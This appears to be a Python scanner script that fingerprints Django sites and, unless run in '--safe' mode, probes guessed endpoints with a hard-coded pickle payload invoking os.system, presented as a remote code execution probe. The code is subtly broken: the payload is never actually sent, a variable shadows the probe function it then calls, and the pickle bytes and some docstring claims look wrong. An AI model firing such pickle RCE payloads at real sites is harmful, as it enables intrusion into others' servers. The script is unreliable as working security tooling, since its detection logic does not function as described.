#!/usr/bin/env python3
"""
Django Insecure Deserialization Scanner
=======================================
Detects and probes for insecure deserialization vulnerabilities in Django applications, specifically targeting the use of Python's `pickle` in sessions, cache backends, or serializers within Django applications.

Affected scenarios:
  - Applications utilizing `pickle` as the session serializer (`SESSION_ENGINE` set to `django.contrib.sessions.backends.db` or similar).
  - Cache backends configured to use `pickle` serialization (e.g., memcached or custom cache engines without explicit safeguards).
  - APIs or exposed functionalities relying on insecure deserialization mechanisms, allowing crafted payloads to execute arbitrary code.

Impact:
  - An attacker may inject malicious serialized objects to gain remote code execution (RCE) or escalate privileges.

Features:
  - Detects Python `pickle` in Django applications by analyzing headers, cookies, and context/session APIs.
  - Optionally probes the deserialization endpoint with crafted malicious payloads (disabled in `--safe` mode).
  - Designed for ethical hacking, bug bounty research, and securing vulnerable systems.

Usage:
  python django_insecure_deserialization_scanner.py --target https://example.com
  python django_insecure_deserialization_scanner.py --list targets.txt --output findings.json
  python django_insecure_deserialization_scanner.py --target https://example.com --safe

References:
  - https://docs.djangoproject.com/en/stable/topics/signing/
  - https://owasp.org/www-community/vulnerabilities/Deserialization_of_Untrusted_Data
  - https://www.cvedetails.com/vulnerability-list/vendor_id-10072/product_id-17901/Django.html
"""

import argparse
import asyncio
import json
import sys
from datetime import datetime, timezone
from typing import Optional

import httpx

# ANSI color helpers
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# Constants
TOOL_NAME = "django_insecure_deserialization_scanner"
CVE_ID = "MULTI"
CVSS = "8.0"
REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 20

# Common cookie names used by Django
DJANGO_COOKIE_NAMES = ["sessionid", "csrftoken"]

# Python Pickle payload for RCE (non-destructive example: execute harmless code)
INSECURE_PAYLOAD = b'\x80\x04\x95\x10\x00\x00\x00\x00\x00\x00\x00\x8c\x04os\nsystem\n\x8c\x06echo test\n\x85\x94R.'

# Fingerprint patterns for Django
DJANGO_FINGERPRINTS = [
    "Content-Type: text/html; charset=utf-8",
    "CSRF verification failed",
    "django.middleware.csrf.CsrfViewMiddleware",
    "Django session cookie",
]


async def probe_url(
    client: httpx.AsyncClient,
    url: str,
    cookies: Optional[dict] = None,
    method: str = "POST",
) -> bool:
    """Send a crafted payload to the target endpoint."""
    payload = {"data": INSECURE_PAYLOAD.hex()}
    try:
        response = await client.request(
            method=method, url=url, cookies=cookies, timeout=REQUEST_TIMEOUT
        )
        if response.status_code == 500 and "pickle" in response.text.lower():
            print(c(f"[+] CRITICAL:", f"Insecure deserialization confirmed at {url}"))
            return True
    except (httpx.RequestError, httpx.HTTPStatusError):
        pass
    return False


async def scan_target(client: httpx.AsyncClient, target: str, safe_mode: bool) -> dict:
    """Scan an individual target for insecure deserialization."""
    findings = {"target": target, "vulnerable": False, "details": []}
    try:
        response = await client.get(
            target, timeout=REQUEST_TIMEOUT, headers={"User-Agent": "DeserializationScanner"}
        )

        fingerprints_found = [
            fingerprint for fingerprint in DJANGO_FINGERPRINTS if fingerprint in response.text
        ]

        cookies = response.cookies
        session_present = any(cookie.lower() in DJANGO_COOKIE_NAMES for cookie in cookies.keys())

        findings["details"].append(
            {"fingerprints_detected": fingerprints_found, "session_detected": session_present}
        )

        if session_present:
            print(c(YELLOW, f"[*] Potential Django application detected at: {target}"))
        elif fingerprints_found:
            print(c(GREEN, f"[+] Recognized Django application at: {target}"))

        if not safe_mode:
            endpoints = ["/api/deserialize", "/api/session/verify"]
            for endpoint in endpoints:
                probe_url = f"{target.rstrip('/')}/{endpoint.lstrip('/')}"
                vulnerable = await probe_url(client, probe_url, cookies=cookies)
                if vulnerable:
                    findings["vulnerable"] = True
                    findings["details"].append({"endpoint": probe_url, "status": "CRITICAL"})
                    break

    except (httpx.RequestError, httpx.HTTPStatusError):
        findings["details"].append({"error": "Failed to connect/scan target"})
    return findings


async def async_main(args):
    """Main asynchronous workflow."""
    # Setup async HTTP client and semaphore for concurrency control
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        semaphore = asyncio.Semaphore(args.concurrency)

        async def bounded_scan(target):
            async with semaphore:
                return await scan_target(client, target, args.safe)

        if args.list:
            with open(args.list) as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            targets = [args.target]

        results = await asyncio.gather(*[bounded_scan(target) for target in targets])

    # Write to output file if specified
    if args.output:
        with open(args.output, "w") as f:
            json.dump(
                {"tool": TOOL_NAME, "timestamp": datetime.now(tz=timezone.utc).isoformat(), "results": results},
                f,
            )
        print(c(GREEN, f"[+] Results saved to {args.output}"))

    return results


def main():
    parser = argparse.ArgumentParser(description="Django insecure deserialization scanner.")
    parser.add_argument("--target", type=str, help="Target URL (e.g., http://example.com)")
    parser.add_argument(
        "--list", type=str, help="Path to a file containing line-separated target URLs"
    )
    parser.add_argument("--output", type=str, help="Path to save scan results as JSON")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode — disable payload probes")
    parser.add_argument("--concurrency", type=int, default=20, help="Concurrent tasks (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        print(c(RED, "[!] Error: Either --target or --list must be specified."))
        sys.exit(1)

    asyncio.run(async_main(args))


if __name__ == "__main__":
    main()
